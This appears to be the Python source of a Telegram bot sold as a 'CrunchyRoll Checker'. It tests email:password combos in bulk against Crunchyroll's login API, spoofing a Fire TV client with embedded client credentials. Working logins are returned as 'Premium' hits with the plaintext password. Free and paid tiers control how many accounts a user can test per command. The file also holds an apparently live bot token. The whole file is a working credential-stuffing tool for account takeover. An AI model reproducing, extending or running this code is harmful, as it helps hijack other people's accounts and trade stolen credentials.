import os
import requests
import telebot
import time
import threading
from uuid import uuid1
from datetime import datetime, timedelta
from flask import Flask, request

bot = telebot.TeleBot('7308448311:AAF5MdrUTcN9FsZnOpBFHoiipDRcCutigYE')

authorized_users = set()  # Authorized users set, initially empty, will load from file
free_users = set()  # Free users set, will load from file
user_limits = {}  # Tracks the limit of mchk for free users

hits_file = "CʀᴜɴᴄʜʏRᴏʟʟ_Hɪᴛs.txt"
cooldown = {}
cooldown_time = 30  # Free user cooldown in seconds
mchk_max_free = 3  # Free users can check up to 3 combinations per command
weekly_limit = 30  # Free users can check a maximum of 10 combinations per week
authorized_limit = 150  # Authorized users can check 150 combinations

owner_id = "5727462573"  # Replace with your own chat ID
stats_file = "bot_stats.txt"  # File to store total_users count
authorized_users_file = "authorized_users.txt"
free_users_file = "free_users.txt"
github_repo_url = "https://raw.githubusercontent.com/BHAINKAR/niga/main/"

# Global variables for tracking users
total_users = 0  # Will load from stats file


# Helper function to load a file from GitHub if not available locally
def load_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            return f.read()
    else:
        file_url = github_repo_url + file_path
        response = requests.get(file_url)
        if response.status_code == 200:
            return response.text
        else:
            return None


# Load authorized and free users from file
def load_users():
    global total_users

    # Load authorized users
    authorized_data = load_file(authorized_users_file)
    if authorized_data:
        for line in authorized_data.splitlines():
            authorized_users.add(line.strip())

    # Load free users
    free_data = load_file(free_users_file)
    if free_data:
        for line in free_data.splitlines():
            free_users.add(line.strip())

    # Load the total users from the stats file
    stats_data = load_file(stats_file)
    if stats_data:
        total_users = int(stats_data.strip())
    else:
        total_users = len(authorized_users) + len(free_users)
        save_stats()  # Save initial stats if the file doesn't exist


# Save authorized and free users to file
def save_users():
    with open(authorized_users_file, "w") as f:
        for user in authorized_users:
            f.write(user + "\n")
    with open(free_users_file, "w") as f:
        for user in free_users:
            f.write(user + "\n")


# Save the total users to the stats file
def save_stats():
    with open(stats_file, "w") as f:
        f.write(str(total_users))


load_users()  # Load users at startup

app = Flask(__name__)

@app.route('/' + bot.token, methods=['POST'])
def get_message():
    json_str = request.stream.read().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return '!', 200

@app.route("/", methods=['GET'])
def index():
    return "Bot is running!"

# Helper function to get current time
def current_time():
    return datetime.now()

# Helper function to check if a week has passed since the last reset
def is_week_over(last_reset):
    return current_time() >= last_reset + timedelta(weeks=1)

# Check if the user is authorized
def is_authorized(user_id):
    return str(user_id) in authorized_users

# Anti-spam cooldown for free users
def anti_spam(func):
    def wrapper(message):
        user_id = message.from_user.id
        current_time = time.time()

        if str(user_id) not in authorized_users:
            if user_id in cooldown and current_time - cooldown[user_id] < cooldown_time:
                bot.send_message(message.chat.id, f"Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {int(cooldown_time - (current_time - cooldown[user_id]))} Sᴇᴄᴏɴᴅs.", disable_web_page_preview=True)
                return
            cooldown[user_id] = current_time

        return func(message)
    return wrapper

# Reset weekly limit if necessary
def reset_weekly_limit(user_id):
    if user_id not in user_limits:
        user_limits[user_id] = {'count': 0, 'last_reset': current_time()}
    elif is_week_over(user_limits[user_id]['last_reset']):
        user_limits[user_id] = {'count': 0, 'last_reset': current_time()}

# Handle /start command and track new users
@bot.message_handler(commands=['start'])
def start(message):
    global total_users
    user_id = str(message.from_user.id)

    # Check if the user is a new user and add them to free users
    if user_id not in free_users and user_id not in authorized_users:
        free_users.add(user_id)
        total_users += 1
        save_users()  # Save new user to the file
        save_stats()  # Save the updated stats

    chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjR3Y3JldDhodHBhdXg4bTZyd2k4Nmt6MnQxOWhrdDR2cnJtajN1YSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/B1Lopnwqs9WIr3GtnQ/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=(
        "🎉 <b>Wᴇʟᴄᴏᴍᴇ Tᴏ CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b> 🎉\n"
        "\n"
        "🔍 <b>Single Check:</b> Use <code>/chk email:pass</code> to check one account.\n"
        "🔄 <b>Multi-Check:</b> Use <code>/mchk</code> to check up to 3 accounts at once.\n"
        "\n"
        "💡 <b>Fʀᴇᴇ Pʟᴀɴ:</b> 10 /mchk checks/week, 3 accounts at a time, 30s cooldown.\n"
        "🚀 <b>Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ:</b> 150 accounts at once, no cooldown. DM @bhainkar for access.\n"
        "\n"
        "ℹ️ <b>Details:</b> Use /details to check your info"
        "\n"
        "<i>Enjoy fast and accurate checking with</i> <b>CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b>!"
        "\n\n"
        "Bᴏᴛ Bʏ @bhainkar"), parse_mode='HTML')

# Your remaining code logic for handling other bot commands and features...

@bot.message_handler(commands=['details'])
def details(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
    chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWt0YWZyaHRrbG5xNzN4MTlkOWZmeDRyZ2ZjcmlwMjhlcnE1azVlNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/2FHr56vo08zbq8ac0C/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=f"𝗬𝗼𝘂𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n<b>Username:</b> @{username}\n<b>Chat ID:</b><code> {user_id}</code>\n<b>Plan:</b> {plan_type}\n\n<b>Bᴏᴛ ʙʏ</b> @bhainkar", parse_mode="HTML",)

# Command to authorize users (Owner only)
@bot.message_handler(commands=['add'])
def add_user(message):
    global total_users
    user_id = message.from_user.id
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ! Oɴʟʏ ᴛʜᴇ Oᴡɴᴇʀ Cᴀɴ Aᴅᴅ Usᴇʀs.", disable_web_page_preview=True)
        return

    try:
        new_user_id = str(message.text.split()[1])
        if new_user_id not in authorized_users:
            authorized_users.add(new_user_id)
            free_users.discard(new_user_id)  # Remove from free users if they exist there
            save_users()
            bot.send_message(message.chat.id, f"𝗦ᴜᴄᴄᴇss! Aᴅᴅᴇᴅ Aᴜᴛʜᴏʀɪᴢᴇᴅ Usᴇʀ {new_user_id}.", disable_web_page_preview=True)
        else:
            bot.send_message(message.chat.id, f"Usᴇʀ {new_user_id} ɪs ᴀʟʀᴇᴀᴅʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ.", disable_web_page_preview=True)
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /add <user_id> Tᴏ Aᴜᴛʜᴏʀɪᴢᴇ A Usᴇʀ.", disable_web_page_preview=True)

# Command to remove authorized users (Owner only)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.from_user.id
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ! Oɴʟʏ ᴛʜᴇ Oᴡɴᴇʀ ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ᴜsᴇʀs.", disable_web_page_preview=True)
        return

    try:
        remove_user_id = str(message.text.split()[1])
        if remove_user_id in authorized_users:
            authorized_users.remove(remove_user_id)
            bot.send_message(message.chat.id, f"𝗦ᴜᴄᴄᴇss! Rᴇᴍᴏᴠᴇᴅ Aᴜᴛʜᴏʀɪᴢᴇᴅ Usᴇʀ {remove_user_id}.", disable_web_page_preview=True)
            save_users()
        else:
            bot.send_message(message.chat.id, f"Usᴇʀ {remove_user_id} ɴᴏᴛ ɪɴ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ʟɪsᴛ.", disable_web_page_preview=True)
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /remove <user_id> Tᴏ Rᴇᴍᴏᴠᴇ A Usᴇʀ.", disable_web_page_preview=True)

# Command to check bot stats (Owner only)
@bot.message_handler(commands=['stats'])
def bot_stats(message):
    user_id = message.from_user.id
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ! Oɴʟʏ ᴛʜᴇ Oᴡɴᴇʀ ᴄᴀɴ ᴄʜᴇᴄᴋ sᴛᴀᴛs.", disable_web_page_preview=True)
        return

    bot.send_message(message.chat.id, f"𝗕ᴏᴛ Sᴛᴀᴛs:\n<b>Total Users:</b> {total_users}\n<b>Free Users:</b> {len(free_users)}\n<b>Authorized Users:</b> {len(authorized_users)}", parse_mode="HTML")

@bot.message_handler(commands=['chk'])
@anti_spam
def chk(message):
    user_id = str(message.from_user.id)
    current_time = time.time()

    try:
        # Parse the email and password from the message
        email, pasw = message.text.split()[1].split(':')
        
        # Check if the account format is valid
        if not check_account_format(email, pasw):
            bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)
            return

        # If valid account format, apply cooldown
        if user_id not in authorized_users:
            if user_id in cooldown and (current_time - cooldown[user_id] < cooldown_time):
                remaining_time = int(cooldown_time - current_time - cooldown[user_id])
                bot.send_message(message.chat.id, f"Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {remaining_time} Sᴇᴄᴏɴᴅs.", disable_web_page_preview=True)
                return
            cooldown[user_id] = current_time

        # Processing message
        bot.send_message(message.chat.id, "Processing...", disable_web_page_preview=True)

        # Continue with the check process
        result = check_crunchyroll_account(email, pasw, message)
        bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)
        
    except (ValueError, IndexError):
        # Catch errors in the command format and notify the user
        bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)

# Helper function to check if the account format is valid
def check_account_format(email, pasw):
    # Check for the basic structure of email and password
    if "@" in email and len(pasw) > 0:
        return True
    return False


# Handle /mchk for multiple accounts
@bot.message_handler(commands=['mchk'])
@anti_spam
def mchk(message):
    user_id = str(message.from_user.id)

    # Reset the weekly limit if it's a new week
    reset_weekly_limit(user_id)

    if not is_authorized(user_id):
        free_limit = user_limits[user_id]['count']
        if free_limit >= weekly_limit:
            bot.send_message(message.chat.id, f"Yᴏᴜʀ 𝗟ɪᴍɪᴛ Fᴏʀ /mchk Hᴀs Bᴇᴇɴ Rᴇᴀᴄʜᴇᴅ! Wᴀɪᴛ Tɪʟʟ Nᴇxᴛ Wᴇᴇᴋ ᴏʀ Pᴜʀᴄʜᴀsᴇ Mᴏʀᴇ Cʀᴇᴅɪᴛs.", disable_web_page_preview=True)
            return

    try:
        accounts = message.text.split()[1:]
        if not accounts:
           bot.send_message(message.chat.id, "Usᴇ /mchk email:pass\n𝗡𝗢𝗧𝗘: Fʀᴇᴇ ᴜsᴇʀ ᴄᴀɴ ᴄʜᴇᴄᴋ ᴏɴʟʏ 3 ᴀᴄᴄ ᴀᴛ ᴀ ᴛɪᴍᴇ", disable_web_page_preview=True)
           return

        if len(accounts) > mchk_max_free and not is_authorized(user_id):
            bot.send_message(message.chat.id, f"Fʀᴇᴇ Usᴇʀs Cᴀɴ Cʜᴇᴄᴋ Uᴘ ᴛᴏ {mchk_max_free} Aᴄᴄᴏᴜɴᴛs Aᴛ A Tɪᴍᴇ.", disable_web_page_preview=True)
            return

        bot.send_message(message.chat.id, "Pʀᴏᴄᴇssɪɴɢ Mᴜʟᴛɪᴘʟᴇ Aᴄᴄᴏᴜɴᴛs...")

        for account in accounts:
            if ":" not in account:
                bot.send_message(message.chat.id, f"Iɴᴠᴀʟɪᴅ Fᴏʀᴍᴀᴛ: {account}", disable_web_page_preview=True)
                continue

            email, pasw = account.split(':')
            result = check_crunchyroll_account(email, pasw, message)
            bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)

        # Increment the user's usage count if they are not authorized
        if not is_authorized(user_id):
            user_limits[user_id]['count'] += len(accounts)

    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /mchk email:pass [email:pass] (up to 3 for free users)", disable_web_page_preview=True)

# Check Crunchyroll account logic (you can replace this with your API check logic)
def check_crunchyroll_account(email, pasw, message):
    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara"
    }

    try:
        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers)

        if "refresh_token" in res.text:
            token = res.json().get('access_token')
            headers_get = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "User-Agent": "Ktor client",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get)

            if "external_id" in res_get.text:
                # Get the user's first name and username to create a clickable profile link
                first_name = message.from_user.first_name
                username = message.from_user.username
                user_id = message.from_user.id

                # Create a clickable link to the user's profile
                plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
                if username:
                    profile_link = f'<a href="https://t.me/{username}">{first_name}</a>'
                else:
                    profile_link = f'<a href="tg://user?id={user_id}">{first_name}</a>'

                return (f"<b>Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ Pʀᴇᴍɪᴜᴍ</b>\n\n<b>Eᴍᴀɪʟ</b> ✉️: <code>{email}</code>\n<b>Pᴀssᴡᴏʀᴅ</b> 🔑: <code>{pasw}</code>\n\n<b><i>Cʜᴇᴄᴋᴇᴅ ʙʏ</i></b> {profile_link}\n<b><i>Pʟᴀɴ: {plan_type}</i></b>\n<b>Bᴏᴛ ʙʏ</b> @bhainkar")
        elif "Pᴀssᴡᴏʀᴅ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ" in res.text:
            return f"<blockquote expandable>❌ 𝗕𝗔𝗗: {email}:{pasw}</blockquote>"
        elif "Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs" in res.text:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs. Tʀʏ ʟᴀᴛᴇʀ.</blockquote>"
        else:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Uɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ.</blockquote>"
    except requests.exceptions.RequestException as e:
        return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Fᴀɪʟᴇᴅ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ.</blockquote>"
        
# Command to broadcast a message to all users (Owner only)
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = message.from_user.id
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ! Oɴʟʏ ᴛʜᴇ Oᴡɴᴇʀ Cᴀɴ Bʀᴏᴀᴅᴄᴀsᴛ Mᴇssᴀɢᴇs.", disable_web_page_preview=True)
        return

    try:
        # Get the message to broadcast from the command
        broadcast_message = " ".join(message.text.split()[1:])  # Join all parts after /broadcast

        if not broadcast_message:
            bot.send_message(message.chat.id, "Pʟᴇᴀsᴇ Pʀᴏᴠɪᴅᴇ A Mᴇssᴀɢᴇ Tᴏ Bʀᴏᴀᴅᴄᴀsᴛ.", disable_web_page_preview=True)
            return
        
        # Send the broadcast message to all users
        for user in authorized_users.union(free_users):
            try:
                bot.send_message(user, broadcast_message)
            except Exception as e:
                print(f"Failed to send message to {user}: {e}")  # Log the error

        bot.send_message(message.chat.id, "Bʀᴏᴀᴅᴄᴀsᴛ Mᴇssᴀɢᴇ Sᴇɴᴛ Tᴏ Aʟʟ Usᴇʀs!", disable_web_page_preview=True)

    except Exception as e:
        bot.send_message(message.chat.id, f"Sᴏᴍᴇᴛʜɪɴɢ Wᴇɴᴛ Wʀᴏɴɢ: {str(e)}", disable_web_page_preview=True)

# Start the bot
if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://niga-2l8a.onrender.com/" + bot.token)  # Replace with your server URL
    app.run(host="0.0.0.0", port=5000)  # You can change the port number if needed
        
